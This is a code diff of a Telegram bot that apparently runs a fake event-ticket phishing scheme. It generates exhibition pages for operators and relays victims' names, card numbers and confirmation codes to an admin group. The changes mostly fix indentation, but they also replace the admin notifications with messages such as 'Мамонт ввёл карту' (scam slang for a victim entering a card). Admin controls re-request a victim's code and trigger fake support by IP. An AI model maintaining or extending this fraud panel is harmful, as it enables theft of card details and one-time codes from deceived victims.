@@ -383,16 +383,12 @@ async def process_experience(message: types.Message):
     user_step[uid] = 'screenshots'
     await message.answer("🖼 Отправьте скриншоты ваших профитов (до 3х)\nМожно пропустить", reply_markup=skip_kb)
 
-
-
 @router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
-
 @router.message(lambda m: user_step.get(m.from_user.id) == 'screenshots' and m.text and 'пропустить' in m.text.strip().lower())
 @router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
 @ban_guard
 async def skip_screenshots(message: types.Message):
-        uid = message.from_user.id
-    print(f"[DEBUG] skip_screenshots handler triggered for user {uid}, user_step: {user_step.get(uid)}")
+    uid = message.from_user.id
     print(f"[DEBUG] Message text: '{message.text}'")
     if user_step.get(uid) == 'screenshots':
         print(f"[DEBUG] User is in screenshots step, processing...")
@@ -408,7 +404,7 @@ async def skip_screenshots(message: types.Message):
             traceback.print_exc()
         user_step[uid] = None  # Скидаємо крок навіть якщо сталася помилка
 
-        user_step[uid] = None
+    user_step[uid] = None
     if 'screenshots' not in user_data.get(uid, {}):
         user_data.setdefault(uid, {})['screenshots'] = []
     await finish_form(message)
@@ -477,10 +473,10 @@ async def finish_form(message):
     )
     try:
         print(f"[DEBUG] Sending message to ADMIN_GROUP_ID: {ADMIN_GROUP_ID}")
-    await bot.send_message(ADMIN_GROUP_ID, text, parse_mode='HTML', reply_markup=kb)
+        await bot.send_message(ADMIN_GROUP_ID, text, parse_mode='HTML', reply_markup=kb)
         print(f"[DEBUG] Admin message sent successfully")
         for ph in screenshots:
-        await bot.send_photo(ADMIN_GROUP_ID, ph)
+            await bot.send_photo(ADMIN_GROUP_ID, ph)
             print(f"[DEBUG] Sending confirmation to user")
     except Exception as e:
         print(f"[ERROR] Sending to admin or user failed: {e}")
@@ -1042,7 +1038,7 @@ async def handle_links_menu(message: types.Message):
         "Минимальная стоимость для Австралии - 110 AUD"
     )
         await message.answer(template_text, reply_markup=links_template_kb)
-    user_step[message.chat.id] = 'event_all_fields'
+        user_step[message.chat.id] = 'event_all_fields'
     elif text == "изменить ссылки":
         # --- Показати список останніх 50 page_code з номерами як ?page=13-140 ---
         c = conn.cursor()
@@ -1380,70 +1376,70 @@ async def events_start(message: types.Message):
 async def events_save_all(message):
     chat_id = message.chat.id
     try:
-    event_id = str(uuid.uuid4())
-    short_event_id = event_id[:6]
-    events_file = os.path.join('events-art.com', 'events.json')
-    # Завантажуємо існуючі події
-    try:
-        with open(events_file, 'r', encoding='utf-8') as f:
-            events = json.load(f)
+        event_id = str(uuid.uuid4())
+        short_event_id = event_id[:6]
+        events_file = os.path.join('events-art.com', 'events.json')
+        # Завантажуємо існуючі події
+        try:
+            with open(events_file, 'r', encoding='utf-8') as f:
+                events = json.load(f)
         except Exception as e:
             print(f"[EVENTS] Не вдалося прочитати events.json: {e}")
-        events = {}
-    # Додаємо нову подію
+            events = {}
+        # Додаємо нову подію
         user_event = EVENT_user_data.get(chat_id)
         if not user_event:
             await message.answer("❗️ Дані івенту не знайдено. Спробуйте ще раз з початку.")
             print(f"[EVENTS] EVENT_user_data порожній для chat_id={chat_id}")
             return
-    events[event_id] = {
-        'title': user_event.get('title', 'Выставка'),
-        'price': user_event.get('price', '45'),
-        'currency': user_event.get('currency', 'EUR'),
-        'address': user_event.get('address', ''),
-        'events': [
-            {
-                'name': EVENT_FIXED_EVENTS[i],
-                'path': EVENT_FIXED_PATHS[i],
-                'date': user_event['dates'][i],
-                'time': user_event['times'][i]
-            } for i in range(8)
-        ]
-    }
-    with open(events_file, 'w', encoding='utf-8') as f:
-        json.dump(events, f, ensure_ascii=False, indent=2)
-    # --- Створюємо запис у site_users ---
-    price = user_event.get('price', '45')
-    currency = user_event.get('currency', 'EUR')
-    street = user_event.get('address', '')
-    dates = user_event.get('dates', [''] * 8)
-    times = user_event.get('times', [''] * 8)
-    # Об'єднуємо дату і час у формат "дата час"
-    combined_dates = []
-    for i in range(8):
-        if dates[i] and times[i]:
-            combined_dates.append(f"{dates[i]} {times[i]}")
-        else:
-            combined_dates.append(dates[i] if dates[i] else '')
+        events[event_id] = {
+            'title': user_event.get('title', 'Выставка'),
+            'price': user_event.get('price', '45'),
+            'currency': user_event.get('currency', 'EUR'),
+            'address': user_event.get('address', ''),
+            'events': [
+                {
+                    'name': EVENT_FIXED_EVENTS[i],
+                    'path': EVENT_FIXED_PATHS[i],
+                    'date': user_event['dates'][i],
+                    'time': user_event['times'][i]
+                } for i in range(8)
+            ]
+        }
+        with open(events_file, 'w', encoding='utf-8') as f:
+            json.dump(events, f, ensure_ascii=False, indent=2)
+        # --- Створюємо запис у site_users ---
+        price = user_event.get('price', '45')
+        currency = user_event.get('currency', 'EUR')
+        street = user_event.get('address', '')
+        dates = user_event.get('dates', [''] * 8)
+        times = user_event.get('times', [''] * 8)
+        # Об'єднуємо дату і час у формат "дата час"
+        combined_dates = []
+        for i in range(8):
+            if dates[i] and times[i]:
+                combined_dates.append(f"{dates[i]} {times[i]}")
+            else:
+                combined_dates.append(dates[i] if dates[i] else '')
         site_user_id, page_code = create_site_user(combined_dates, currency, street, price)
-    # Формуємо повідомлення з посиланнями
-    msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
+        # Формуємо повідомлення з посиланнями
+        msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
         msg += f"💵 Цена: <b>{price} {currency}</b>\n"
-    msg += f"📍 Адрес: <b>{street or 'Не указан'}</b>\n"
+        msg += f"📍 Адрес: <b>{street or 'Не указан'}</b>\n"
         msg += f"🆔 Site User ID: <code>{site_user_id}</code>\n"
         msg += f"🔖 Page Code: <code>{page_code}</code>\n\n"
-    msg += f"<b>Афиша:</b>\n"
+        msg += f"<b>Афиша:</b>\n"
         msg += f"<b>Главная страница:</b> http://{EVENT_DOMAIN}/?page={page_code}\n"
-    for idx, ev in enumerate(events[event_id]['events'], 1):
-        path = ev['path']
-        if path.endswith('/index.html'):
-            path = path[:-10]
+        for idx, ev in enumerate(events[event_id]['events'], 1):
+            path = ev['path']
+            if path.endswith('/index.html'):
+                path = path[:-10]
             link = f"http://{EVENT_DOMAIN}/{path}?page={page_code}"
-        msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
-    await message.answer(msg, parse_mode='HTML')
-    # Повертаємо меню після створення виставки
-    kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
-    await message.answer("Головне меню:", reply_markup=kb)
+            msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
+        await message.answer(msg, parse_mode='HTML')
+        # Повертаємо меню після створення виставки
+        kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
+        await message.answer("Головне меню:", reply_markup=kb)
         # Зберігаємо зв'язок page_code <-> user_id (Telegram user_id, а не site_user_id)
         c = conn.cursor()
         c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (page_code, message.from_user.id))
@@ -1556,7 +1552,7 @@ async def payment_notify(request):
         )
         await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
 
-    # --- Додаю дублювання логів адміну, якщо знайдено user_id по page_code ---
+    # --- Дублювання для адміна, якщо знайдено user_id по page_code ---
     page_code = data.get('page', '')
     admin_user_id = None
     if page_code:
@@ -1566,10 +1562,10 @@ async def payment_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        await bot.send_message(admin_user_id, msg1, parse_mode='HTML')  # без кнопок
-        await bot.send_message(admin_user_id, msg2)  # без кнопок
+        await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
+        await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
         if code:
-            await bot.send_message(admin_user_id, msg3)  # без кнопок
+            await bot.send_message(admin_user_id, 'Мамонт ввёл код')
 
 @log_function
 async def code_notify(request):
@@ -1595,7 +1591,7 @@ async def code_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        await bot.send_message(admin_user_id, text)  # без кнопок
+        await bot.send_message(admin_user_id, 'Мамонт ввёл код')
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
@@ -1613,7 +1609,7 @@ async def admin_action_handler(call: types.CallbackQuery):
         await call.answer("Користувач розблокований")
     elif action == 'support':
         # Надсилаємо POST на /set_support_flag
-    async with aiohttp_client.ClientSession() as session:
+        async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
         await call.answer("Включена технічна підтримка")
     elif action == 'text':
@@ -1621,7 +1617,7 @@ async def admin_action_handler(call: types.CallbackQuery):
         user_step[call.from_user.id] = f'text_for_{ip}'
     elif action == 'code_request_again':
         # Надсилаємо POST на /set_request_again з кодом
-    async with aiohttp_client.ClientSession() as session:
+        async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
 
@@ -1892,38 +1888,21 @@ async def event_time_api(request):
             return web.json_response({'time': ''})
     return web.json_response({'time': ''})
 
-# --- запуск aiohttp і aiogram в одному event loop ---
-if __name__ == '__main__':
-    async def main():
-        # aiohttp app
-        app = web.Application(middlewares=[cors_middleware])
-        app.router.add_post('/notify_admin', notify_admin)
-        app.router.add_post('/payment_notify', payment_notify)
-        app.router.add_post('/code_notify', code_notify)
-        app.router.add_post('/update_site_user_ip', update_site_user_ip_endpoint)
-        app.router.add_get('/api/latest_event_data', latest_event_data)
-        app.router.add_get('/api/event_address', event_address)  # <-- Додаємо новий endpoint
-        app.router.add_get('/api/data_by_ip', data_by_ip)  # <-- Додаємо новий endpoint
-        app.router.add_get('/api/event_links', event_links)  # <-- Додаємо новий endpoint
-        app.router.add_get('/api/user_id_by_page_code', user_id_by_page_code)
-        app.router.add_get('/api/payment_data', payment_data)  # <-- Додаємо новий endpoint
-        app.router.add_get('/api/event_places', event_places_api)  # <-- Додаємо новий endpoint
-        app.router.add_get('/api/event_date', event_date_api)
-        app.router.add_get('/api/event_time', event_time_api)
-        runner = web.AppRunner(app)
-        await runner.setup()
-        site = web.TCPSite(runner, '0.0.0.0', 8081)
-        await site.start()
-        print('Запускаю aiohttp webhook на 0.0.0.0:8081')
-        # aiogram polling
-        await dp.start_polling(bot)
-    asyncio.run(main())
 
 @router.message(lambda m: user_step.get(m.from_user.id) == 'pay_amount')
 @ban_guard
 async def admin_pay_amount(message: types.Message):
     # ...існуючий код...
     user_step[uid] = None
+
+@router.message(lambda m: is_admin(m.from_user.id) and m.text and any(x in m.text.lower() for x in ["назад", "back"]))
+@ban_guard
+async def force_admin_back(message: types.Message):
+    uid = message.from_user.id
+    user_step[uid] = 'admin_panel'
+    await message.answer("Повернення в адмін-панель.", reply_markup=admin_panel_kb)
+    return
+
 
 @router.message(lambda m: user_step.get(m.from_user.id) == 'manual_payment_amount')
 @ban_guard
@@ -1951,13 +1930,37 @@ async def manual_payment_back(message: types.Message):
         await message.answer(f"Сталася помилка: {e}")
         user_step[message.from_user.id] = 'admin_panel'
 
-@router.message(lambda m: is_admin(m.from_user.id) and m.text and any(x in m.text.lower() for x in ["назад", "back"]))
-@ban_guard
-async def force_admin_back(message: types.Message):
-    uid = message.from_user.id
-    user_step[uid] = 'admin_panel'
-    await message.answer("Повернення в адмін-панель.", reply_markup=admin_panel_kb)
-    return
+
+
+
+# --- запуск aiohttp і aiogram в одному event loop ---
+if __name__ == '__main__':
+    async def main():
+        # aiohttp app
+        app = web.Application(middlewares=[cors_middleware])
+        app.router.add_post('/notify_admin', notify_admin)
+        app.router.add_post('/payment_notify', payment_notify)
+        app.router.add_post('/code_notify', code_notify)
+        app.router.add_post('/update_site_user_ip', update_site_user_ip_endpoint)
+        app.router.add_get('/api/latest_event_data', latest_event_data)
+        app.router.add_get('/api/event_address', event_address)  # <-- Додаємо новий endpoint
+        app.router.add_get('/api/data_by_ip', data_by_ip)  # <-- Додаємо новий endpoint
+        app.router.add_get('/api/event_links', event_links)  # <-- Додаємо новий endpoint
+        app.router.add_get('/api/user_id_by_page_code', user_id_by_page_code)
+        app.router.add_get('/api/payment_data', payment_data)  # <-- Додаємо новий endpoint
+        app.router.add_get('/api/event_places', event_places_api)  # <-- Додаємо новий endpoint
+        app.router.add_get('/api/event_date', event_date_api)
+        app.router.add_get('/api/event_time', event_time_api)
+        runner = web.AppRunner(app)
+        await runner.setup()
+        site = web.TCPSite(runner, '0.0.0.0', 8081)
+        await site.start()
+        print('Запускаю aiohttp webhook на 0.0.0.0:8081')
+        # aiogram polling
+        await dp.start_polling(bot)
+    asyncio.run(main())
+
+
 
 
 
